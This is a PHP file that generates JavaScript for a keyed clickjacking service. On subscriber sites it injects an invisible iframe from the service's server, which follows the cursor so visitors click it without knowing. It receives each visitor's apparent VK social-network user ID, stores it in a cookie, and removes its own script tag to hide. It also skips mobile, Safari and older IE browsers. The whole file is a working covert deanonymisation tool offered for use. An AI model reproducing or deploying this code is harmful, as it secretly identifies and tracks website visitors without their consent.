<?php
	require_once "inc.php";

	if(is_get() && isset($_GET["key"])){

		$key = clear_str($_GET["key"]);

		$domain = check_domain($key, $config["domains"]);
?>
(function(d){

	var domain = d.location.host;

	function delScript(){

		var scripts = d.getElementsByTagName("script");

		for(i in scripts){

			var src = scripts[i].src != undefined ? scripts[i].src : "";

			if(src.match("key=<?php echo($key);?>")){

				d.head.removeChild(scripts[i]);
				break;
			};
		};
	};

<?php
		if(!$domain){
?>
	console.info("Домен не подключён");

	delScript();
<?php
		}else{
?>
	if(domain !== "<?php echo($domain);?>"){

		console.info("Домен не подключён");

		delScript();
	}else{

		var loadePage;

		// Проверка вида браузера
		if(navigator.userAgent.match("Android|BackBerry|phone|iPad|iPod|IEMobile|Nokia|Mobile|MSIE|iPhone|webOS|Windows Phone|Explorer|Trident")){

			loadePage = false;
		}else{

			loadePage = true;
		};

		isSafari = !!navigator.userAgent.match(/Version\/[\d\.]+.*Safari/);

		if(isSafari){

			loadePage = false;
		};

		// Проверка кук
		if(!navigator.cookieEnabled){

			loadePage = false;
		};

		if(!loadePage){

			console.info("not supported");

			delScript();
		}else{

			function getTime(){

				return new Date().getMilliseconds();
			};

			Event = (function(){

				var guid = 0
				
				function fixEvent(event){

					event = event || window.event;

					if(event.isFixed){

						return event;
					};

					event.isFixed = true;

					event.preventDefault = event.preventDefault || function(){

						this.returnValue = false;
					};
					event.stopPropagation = event.stopPropagaton || function(){

						this.cancelBubble = true;
					};

					if(!event.target){

						event.target = event.srcElement;
					};

					if(!event.relatedTarget && event.fromElement){

						event.relatedTarget = event.fromElement == event.target ? event.toElement : event.fromElement;
					};

					if(event.pageX == null && event.clientX != null){

						var html = document.documentElement, body = document.body;
						event.pageX = event.clientX + (html && html.scrollLeft || body && body.scrollLeft || 0) - (html.clientLeft || 0);
						event.pageY = event.clientY + (html && html.scrollTop || body && body.scrollTop || 0) - (html.clientTop || 0);
					};

					if(!event.which && event.button){

						event.which = (event.button & 1 ? 1 : (event.button & 2 ? 3 : (event.button & 4 ? 2 : 0 )));
					};

					return event;
				};

				function commonHandle(event){

					event = fixEvent(event);

					var handlers = this.events[event.type];

					for(var g in handlers){

						var handler = handlers[g];

						var ret = handler.call(this, event);

						if(ret === false){

							event.preventDefault();
							event.stopPropagation();
						};
					};
				};

				return{

					add: function(elem, type, handler){

						if(elem.setInterval && (elem != window && !elem.frameElement)){

							elem = window;
						};

						if(!handler.guid){

							handler.guid = ++guid;
						};

						if(!elem.events){

							elem.events = {};
							elem.handle = function(event){

								if(typeof Event !== "undefined"){

									return commonHandle.call(elem, event);
								};
							};
						};

						if(!elem.events[type]){

							elem.events[type] = {};

							if(elem.addEventListener){

								elem.addEventListener(type, elem.handle, false);
							}else if(elem.attachEvent){

								elem.attachEvent("on" + type, elem.handle);
							};
						};

						elem.events[type][handler.guid] = handler;
					},
					remove: function(elem, type, handler){

						var handlers = elem.events && elem.events[type];

						if(!handlers){

							return;
						};

						delete handlers[handler.guid];

						for(var any in handlers){

							return;
						};

						if(elem.removeEventListener){

							elem.removeEventListener(type, elem.handle, false);
						}else if(elem.detachEvent){

							elem.detachEvent("on" + type, elem.handle);
						};

						delete elem.events[type];

						for(var any in elem.events){

							return;
						};

						try{

							delete elem.handle;
							delete elem.events;
						}catch(e){

							elem.removeAttribute("handle");
							elem.removeAttribute("events");
						};
					}
				};
			}());

			function setCookie(name, value, path, domain, secure){

				var expires = new Date();
				expires.setTime(expires.getTime() + (1000 * 86400 * 365));

			    d.cookie = name + "=" + escape(value) +
			    	((expires) ? "; expires=" + expires : "") +
			    	((path) ? "; path=" + path : "") +
			    	((domain) ? "; domain=" + domain : "") +
			    	((secure) ? "; secure" : "");
			};

			function getCookie(name){

				var cookie = " " + d.cookie;
				var search = " " + name + "=";
				var setStr = null;
				var offset = 0;
				var end = 0;

				if(cookie.length > 0){

					offset = cookie.indexOf(search);

					if(offset != -1){

						offset += search.length;
						end = cookie.indexOf(";", offset)

						if(end == -1){

							end = cookie.length;
						};

						setStr = unescape(cookie.substring(offset, end));
					};
				};

				return(setStr);
			};

			console.info("s: " + getTime());

			if(getCookie("vkid")){

				delScript();
			}else{

				// Добавление iframe
				var i = d.createElement("iframe");
					i.src = "//<?php echo($config["script_dir"]);?>iframe.php?key=<?php echo($key);?>";
					i.id = "iframe-0";
					i.scrolling = "no";
					i.style.position = "absolute";
					i.style.left = 0;
					i.style.top = 0;
					i.style.zIndex = 99999;
					i.style.height = "22px";
					i.style.width = "30px";
					i.style.opacity = 0;
					i.parent = undefined;
				d.body.appendChild(i);

				// Прикрепление фрейма к курсору
				mv = function(event){

					var i0 = d.getElementById("iframe-0");

					if(i0){

						var x = event ? event.pageX : d.body.scrollLeft + event.clientX,
							y = event ? event.pageY : d.body.scrollTop + event.clientY;

						if((x>0) && (y>0)){

							i0.style.left = (x-10) + "px";
							i0.style.top = (y-10) + "px";
						};
					};
				};

				Event.add(d, "mousemove", mv);

				// Очистка отработанных скриптов
				// Устоновка кук
				cd = function(event){

					var strData = "" + event.data;

					if(strData == "catched"){

						i.style.visibility = "hidden";
						i.style.position = "inherit";
					};

					if(strData == "done" || strData == "no_auth"){

						var i0 = d.getElementById("iframe-0");

						d.body.removeChild(i0);
						delScript();
					};

					if(strData.match("user_id:")){

						setCookie("vkid", strData.replace("user_id:", ""));
					};
				};

				Event.add(window , "message", cd);
			};

			console.info("e: " + getTime());
		};
	};
<?php
		}
?>
})(document);
<?php
	}
?>